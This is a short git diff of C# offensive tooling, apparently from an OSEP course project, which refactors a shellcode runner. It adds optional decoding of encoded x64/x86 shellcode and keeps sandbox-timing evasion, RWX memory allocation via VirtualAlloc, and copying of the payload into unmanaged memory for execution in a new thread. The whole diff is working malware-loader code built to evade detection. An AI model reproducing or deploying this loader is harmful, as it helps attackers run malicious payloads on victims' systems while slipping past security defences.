@@ -29,12 +29,32 @@ namespace OSEP
             if (CONFIG.DETECT_SANDBOX_TIME)
                 Evasion.SandboxTimeDetect(2000);
 
+            byte[] _shellcode;
 
 #if X64
-            int size = CONFIG.SHELLCODE64.Length;
+            if (CONFIG.ENCODED)
+            {
+                _shellcode = Evasion.Decode(CONFIG.SHELLCODE64);
+            }
+            else
+            {
+                _shellcode = CONFIG.SHELLCODE64;
+            }
+
 #elif X86
-            int size = CONFIG.SHELLCODE86.Length;
+            if (CONFIG.ENCODED)
+            {
+                _shellcode = Evasion.Decode(CONFIG.SHELLCODE86);
+            }
+            else
+            {
+                _shellcode = CONFIG.SHELLCODE86;
+            }
 #endif
+
+
+            int size = _shellcode.Length;
+
 
 
 
@@ -42,11 +62,8 @@ namespace OSEP
             IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
 
             //Copy the shellcode from managed memory (the .NET byte[]) to unmanaged memory. GC can't touch this memory because it's unmanaged.
-#if X64
-            Marshal.Copy(CONFIG.SHELLCODE64, 0, addr, size);
-#elif X86
-            Marshal.Copy(CONFIG.SHELLCODE86, 0, addr, size);
-#endif
+            Marshal.Copy(_shellcode, 0, addr, size);
+
 
 
             //Create a thread that points to the start of the shellcode. This will execute the shellcode in a new thread.
